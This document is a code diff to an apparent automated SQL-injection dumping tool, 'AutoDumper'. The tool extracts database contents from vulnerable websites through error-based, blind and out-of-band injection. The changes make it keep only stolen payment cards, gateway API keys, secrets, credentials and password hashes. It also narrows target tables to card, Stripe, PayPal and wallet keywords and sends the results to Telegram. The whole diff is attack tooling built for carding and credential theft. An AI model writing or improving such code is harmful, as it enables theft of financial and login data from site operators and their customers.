@@ -400,19 +400,27 @@ class AutoDumper:
                     logger.debug(f"[AutoDump] Blind dump failed: {e}")
         
         elif sqli_result.injection_type == "error":
-            # Error-based — try union then blind
+            # Error-based — targeted_dump now supports error extraction natively
             try:
                 dump_data = await self.dumper.targeted_dump(sqli_result, session)
-                parsed.source = "error_union"
-            except Exception:
+                parsed.source = "error"
+                if dump_data and dump_data.total_rows == 0:
+                    logger.info(f"[AutoDump] Error dump returned 0 rows, trying blind fallback")
+                    dump_data = None  # Force blind fallback
+            except Exception as e:
+                logger.debug(f"[AutoDump] Error-based dump failed: {e}")
+            
+            # Blind fallback for error-based when direct extraction fails
+            if not dump_data and getattr(self.config, 'dumper_blind_enabled', True):
                 try:
                     dump_data = await self.dumper.blind_targeted_dump(sqli_result, session)
                     parsed.source = "error_blind"
                 except Exception as e:
-                    logger.debug(f"[AutoDump] Error-based dump failed: {e}")
+                    logger.debug(f"[AutoDump] Error-blind fallback failed: {e}")
         
         # ── Step 2: OOB fallback if no data yet ──
-        if not dump_data and self.oob_injector:
+        has_data = dump_data and dump_data.total_rows > 0
+        if not has_data and self.oob_injector:
             try:
                 oob_result = await self.oob_injector.test_and_report(url, session)
                 if oob_result and oob_result.vulnerable:
@@ -423,7 +431,7 @@ class AutoDumper:
             except Exception as e:
                 logger.debug(f"[AutoDump] OOB fallback failed: {e}")
         
-        if not dump_data:
+        if not dump_data or dump_data.total_rows == 0:
             logger.info(f"[AutoDump] No data extracted from {url[:60]}")
             return parsed
         
@@ -449,11 +457,39 @@ class AutoDumper:
         if self.key_validator and parsed.gateway_keys:
             await self._validate_keys(parsed, url, session)
         
-        # ── Step 6: Generate files ──
+        # ── Step 6: Validate dump quality before generating files ──
+        # Only proceed with file generation + Telegram if we found actual
+        # high-value data (cards, keys, secrets). Prevents sending CSVs
+        # full of random CMS config/blog data.
+        has_high_value = (
+            parsed.cards or
+            parsed.gateway_keys or
+            parsed.secrets or
+            parsed.valid_keys
+        )
+        has_any_value = (
+            has_high_value or
+            parsed.credentials or
+            parsed.hashes or
+            parsed.combos_user_pass or
+            parsed.combos_email_pass
+        )
+        
+        if not has_any_value:
+            logger.info(f"[AutoDump] No high-value data found for {url[:60]} — "
+                       f"skipping file generation and Telegram report")
+            return parsed
+        
+        # Generate files
         await self._generate_files(dump_data, parsed, url)
         
-        # ── Step 7: Send to Telegram ──
-        await self._report_to_telegram(parsed, url)
+        # ── Step 7: Send to Telegram — only if high-value data or creds ──
+        cards_only = getattr(self.config, 'cards_only_reporting', False)
+        if cards_only and not has_high_value:
+            logger.info(f"[AutoDump] cards_only_reporting=True, skipping Telegram "
+                       f"(no cards/keys/secrets, only creds/hashes)")
+        else:
+            await self._report_to_telegram(parsed, url)
         
         # ── Step 8: Persist to DB ──
         self._persist(parsed, url)
@@ -650,7 +686,8 @@ class AutoDumper:
     # ──────────────────────────────────────────────────────────
 
     async def _generate_files(self, dump_data, parsed: ParsedDumpData, url: str):
-        """Generate dump files: JSON, CSV, combos, hashes."""
+        """Generate dump files: JSON, CSV, combos, hashes.
+        Only generates full CSV if there's actual card/key/secret data."""
         from urllib.parse import urlparse
         domain = urlparse(url).netloc.replace(":", "_")
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -658,8 +695,9 @@ class AutoDumper:
         
         generated = {}
         
-        # Full data dump (CSV)
-        if dump_data.data:
+        # Full data dump (CSV) — only if we have cards, keys, or secrets
+        has_high_value = parsed.cards or parsed.gateway_keys or parsed.secrets or parsed.valid_keys
+        if dump_data.data and has_high_value:
             csv_path = f"{base}_full.csv"
             try:
                 all_rows = []
@@ -923,11 +961,14 @@ class AutoDumper:
         all_tables = set(initial_dump.tables.keys())
         
         # Find undumped tables that might have value
+        # STRICT: Only payment/card/gateway-related keywords
+        # Removed generic terms (config, setting, option, token, key, session,
+        # log, customer, client, member, subscriber, account) that pull in CMS junk
         INTERESTING_KEYWORDS = {
-            'admin', 'config', 'setting', 'option', 'token', 'api',
-            'key', 'secret', 'credential', 'auth', 'session', 'log',
-            'transaction', 'payment', 'order', 'invoice', 'billing',
-            'customer', 'client', 'member', 'subscriber', 'account',
+            'card', 'credit', 'payment', 'billing', 'gateway',
+            'stripe', 'paypal', 'braintree', 'transaction',
+            'checkout', 'vault', 'wallet', 'invoice',
+            'secret', 'credential', 'api_key',
         }
         
         extra_tables = []
